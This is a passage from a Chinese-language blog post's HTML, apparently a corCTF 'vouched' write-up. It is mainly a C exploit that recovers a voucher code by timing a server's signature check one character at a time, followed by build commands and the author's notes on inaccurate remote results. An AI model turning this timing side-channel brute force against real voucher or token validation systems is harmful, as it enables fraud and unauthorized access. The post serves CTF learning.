class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;curl/curl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/evp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/sha.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PBKDF2_ITERATIONS 1750000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DKLEN 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHARSET <span class="string">&quot;ABCDEF0123456789&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHARSET_SIZE 16</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *TARGET_URL = <span class="string">&quot;http://127.0.0.1:8001/check&quot;</span>;</span><br><span class="line"><span class="comment">// 用于签名的 User-Agent (与服务端校验时用作 salt)</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *USER_AGENT = <span class="string">&quot;sheep&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算 PBKDF2-HMAC-SHA256，返回 hex string（64 字符 + 终止0），调用者需 free()</span></span><br><span class="line"><span class="function"><span class="type">char</span>* <span class="title">calculate_signature</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* voucher, <span class="type">const</span> <span class="type">char</span>* user_agent)</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> derived_key[DKLEN];</span><br><span class="line">    <span class="type">char</span>* signature = <span class="built_in">malloc</span>(DKLEN*<span class="number">2</span> + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!signature) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">PKCS5_PBKDF2_HMAC</span>(voucher, <span class="built_in">strlen</span>(voucher),</span><br><span class="line">                          (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)user_agent, <span class="built_in">strlen</span>(user_agent),</span><br><span class="line">                          PBKDF2_ITERATIONS, <span class="built_in">EVP_sha256</span>(), DKLEN, derived_key) != <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;PBKDF2 failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(signature);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; DKLEN; ++i) &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(signature + (i * <span class="number">2</span>), <span class="string">&quot;%02x&quot;</span>, derived_key[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    signature[DKLEN*<span class="number">2</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> signature;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发请求并测量总耗时（微秒），返回 &gt;0 的耗时，否则返回 -1</span></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="title">measure_response_time</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* voucher, <span class="type">const</span> <span class="type">char</span>* signature)</span> </span>&#123;</span><br><span class="line">    CURL *curl = <span class="built_in">curl_easy_init</span>();</span><br><span class="line">    <span class="keyword">if</span> (!curl) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">timeval</span> start, end;</span><br><span class="line">    <span class="type">long</span> response_time = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造 JSON payload</span></span><br><span class="line">    <span class="type">char</span> json_payload[<span class="number">1024</span>];</span><br><span class="line">    <span class="built_in">snprintf</span>(json_payload, <span class="built_in">sizeof</span>(json_payload), <span class="string">&quot;&#123;\&quot;voucher\&quot;:\&quot;%s\&quot;,\&quot;signature\&quot;:\&quot;%s\&quot;&#125;&quot;</span>, voucher, signature);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">curl_slist</span> *headers = <span class="literal">NULL</span>;</span><br><span class="line">    headers = <span class="built_in">curl_slist_append</span>(headers, <span class="string">&quot;Content-Type: application/json&quot;</span>);</span><br><span class="line">    <span class="comment">// 注意这里也把 User-Agent 放进 header; curl 也有单独的 CURLOPT_USERAGENT</span></span><br><span class="line">    headers = <span class="built_in">curl_slist_append</span>(headers, USER_AGENT);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">curl_easy_setopt</span>(curl, CURLOPT_URL, TARGET_URL);</span><br><span class="line">    <span class="built_in">curl_easy_setopt</span>(curl, CURLOPT_POST, <span class="number">1L</span>);</span><br><span class="line">    <span class="built_in">curl_easy_setopt</span>(curl, CURLOPT_POSTFIELDS, json_payload);</span><br><span class="line">    <span class="built_in">curl_easy_setopt</span>(curl, CURLOPT_HTTPHEADER, headers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 忽略 SSL 验证（CTF 环境常用）；生产环境不要这样</span></span><br><span class="line">    <span class="built_in">curl_easy_setopt</span>(curl, CURLOPT_SSL_VERIFYPEER, <span class="number">0L</span>);</span><br><span class="line">    <span class="built_in">curl_easy_setopt</span>(curl, CURLOPT_SSL_VERIFYHOST, <span class="number">0L</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">curl_easy_setopt</span>(curl, CURLOPT_CONNECTTIMEOUT, <span class="number">10L</span>);</span><br><span class="line">    <span class="built_in">curl_easy_setopt</span>(curl, CURLOPT_TIMEOUT, <span class="number">30L</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">gettimeofday</span>(&amp;start, <span class="literal">NULL</span>);</span><br><span class="line">    CURLcode res = <span class="built_in">curl_easy_perform</span>(curl);</span><br><span class="line">    <span class="built_in">gettimeofday</span>(&amp;end, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (res == CURLE_OK) &#123;</span><br><span class="line">        response_time = (end.tv_sec - start.tv_sec) * <span class="number">1000000L</span> + (end.tv_usec - start.tv_usec);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        response_time = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">curl_slist_free_all</span>(headers);</span><br><span class="line">    <span class="built_in">curl_easy_cleanup</span>(curl);</span><br><span class="line">    <span class="keyword">return</span> response_time;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 针对某个位置穷举 charset 中的字符，返回“最佳”字符（耗时最长）</span></span><br><span class="line"><span class="function"><span class="type">char</span> <span class="title">find_character_at_position</span><span class="params">(<span class="type">char</span>* current_voucher, <span class="type">int</span> position)</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *charset = CHARSET;</span><br><span class="line">    <span class="type">char</span> best_char = charset[<span class="number">0</span>];</span><br><span class="line">    <span class="type">long</span> best_time = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Testing position %d...\n&quot;</span>, position);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CHARSET_SIZE; ++i) &#123;</span><br><span class="line">        <span class="type">char</span> test_char = charset[i];</span><br><span class="line">        <span class="type">char</span> prev = current_voucher[position];</span><br><span class="line">        current_voucher[position] = test_char;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span>* sig = <span class="built_in">calculate_signature</span>(current_voucher, USER_AGENT);</span><br><span class="line">        <span class="keyword">if</span> (!sig) &#123;</span><br><span class="line">            current_voucher[position] = prev;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> t = <span class="built_in">measure_response_time</span>(current_voucher, sig);</span><br><span class="line">        <span class="keyword">if</span> (t &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;  %c: %ld μs%s\n&quot;</span>, test_char, t, (t &gt; best_time ? <span class="string">&quot; (new best)&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">            <span class="keyword">if</span> (t &gt; best_time) &#123;</span><br><span class="line">                best_time = t;</span><br><span class="line">                best_char = test_char;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;  %c: failed\n&quot;</span>, test_char);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(sig);</span><br><span class="line"></span><br><span class="line">        current_voucher[position] = prev;</span><br><span class="line">        <span class="built_in">usleep</span>(<span class="number">50000</span>); <span class="comment">// small delay to avoid server rate limits</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Best char at %d =&gt; %c (time %ld μs)\n&quot;</span>, position, best_char, best_time);</span><br><span class="line">    <span class="keyword">return</span> best_char;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 初始模板：文章中用 A-AA-AAA-AAA 那种形式</span></span><br><span class="line">    <span class="comment">// 注意 voucher 的格式示例： &quot;X-XXX-XXX-XXX&quot; (len 12 with dashes at pos 1,4,8)</span></span><br><span class="line">    <span class="type">char</span> voucher[<span class="number">64</span>];</span><br><span class="line">    <span class="comment">// 初始化成某个占位（示例用 &#x27;A&#x27; 填充可变位，&#x27;-&#x27; 放在 dash 位置）</span></span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> L = <span class="number">12</span>;</span><br><span class="line">    <span class="type">int</span> dash_positions[] = &#123;<span class="number">1</span>, <span class="number">4</span>, <span class="number">8</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, di = <span class="number">0</span>; i &lt; L; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (di &lt; <span class="number">3</span> &amp;&amp; i == dash_positions[di]) &#123;</span><br><span class="line">            voucher[i] = <span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">            di++;</span><br><span class="line">        &#125; <span class="keyword">else</span> voucher[i] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    voucher[L] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Initial voucher template: %s\n&quot;</span>, voucher);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 逐位爆破（跳过 dash 位置）</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> pos = <span class="number">0</span>; pos &lt; L; ++pos) &#123;</span><br><span class="line">        <span class="keyword">if</span> (voucher[pos] == <span class="string">&#x27;-&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="type">char</span> found = <span class="built_in">find_character_at_position</span>(voucher, pos);</span><br><span class="line">        voucher[pos] = found;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Progress: %s\n&quot;</span>, voucher);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Final discovered voucher: %s\n&quot;</span>, voucher);</span><br><span class="line">    <span class="comment">// 最后再计算签名并尝试一次获取 flag</span></span><br><span class="line">    <span class="type">char</span> *final_sig = <span class="built_in">calculate_signature</span>(voucher, USER_AGENT);</span><br><span class="line">    <span class="keyword">if</span> (final_sig) &#123;</span><br><span class="line">        <span class="type">long</span> t = <span class="built_in">measure_response_time</span>(voucher, final_sig);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Final attempt time: %ld μs\n&quot;</span>, t);</span><br><span class="line">        <span class="built_in">free</span>(final_sig);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>命令行</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libcurl4-openssl-dev libssl-dev</span><br><span class="line">gcc -O2 -Wall exploit.c -o exploit -lcurl -lssl -lcrypto</span><br><span class="line">./exploit</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>终端效果和我差不多()<br>没办法题目环境关了，本地测的都挺精准的，不过精度用C写的脚本提高很大<br>希望实际环境中也是如此<br>感觉这里的有优点就是用了用高精度计时工具（C gettimeofday()、QueryPerformanceCounter 等），大体意思都差不多<br>实际爆破速度也没有提升很多<br>原脚本的优点在于，手动多了一个判断,提高了速度，比如如果1比2慢0.35秒，直接选择1为正确字符，不会往下爆，本地测环境还ok没什么问题，远程就炸了<br>好了写完这些话基本就爆丸了，好家伙<br><code>C-1D-81D-8C1</code><br>倒数第二个字符从F变成C()<br>本地都差了不少<br>有无大手子看看exp，人麻了</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0me</a></li>
+        
+          <li><a href="/categories">Categ0r1es</a></li>
+        
+          <li><a href="/archives/">Artic1es</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">Searh</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-number">2.</span> <span class="toc-text">题解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">3.</span> <span class="toc-text">后记</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/corCTF-vouched/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/corCTF-vouched/&text=corCTF-vouched"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/corCTF-vouched/&title=corCTF-vouched"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/corCTF-vouched/&is_video=false&description=corCTF-vouched"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=corCTF-vouched&body=Check out this article: https://hexo.sheep-sys-sudo.top/corCTF-vouched/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/corCTF-vouched/&title=corCTF-vouched"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/corCTF-vouched/&title=corCTF-vouched"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/corCTF-vouched/&title=corCTF-vouched"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/corCTF-vouched/&title=corCTF-vouched"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/corCTF-vouched/&name=corCTF-vouched&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/corCTF-vouched/&t=corCTF-vouched"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Sh_eePppp
+  </div>
+
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">h0me</a></li><!--
+    --><!--
+      --><li><a href="/categories">Categ0r1es</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Artic1es</a></li><!--
+    --><!--
+      --><li><a href="/links/">L1nks</a></li><!--
+    --><!--
+      --><li><a href="/search/">Searh</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+
+  <!-- 邮箱信息独立出来，靠右下角 -->
+  <div class="footer-contact">
+    如果文章出现错误，可以联系我进行更改，感谢 
+    <a href="mailto:sh_eepppp@qq.com  ：）">sh_eepppp@qq.com</a>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
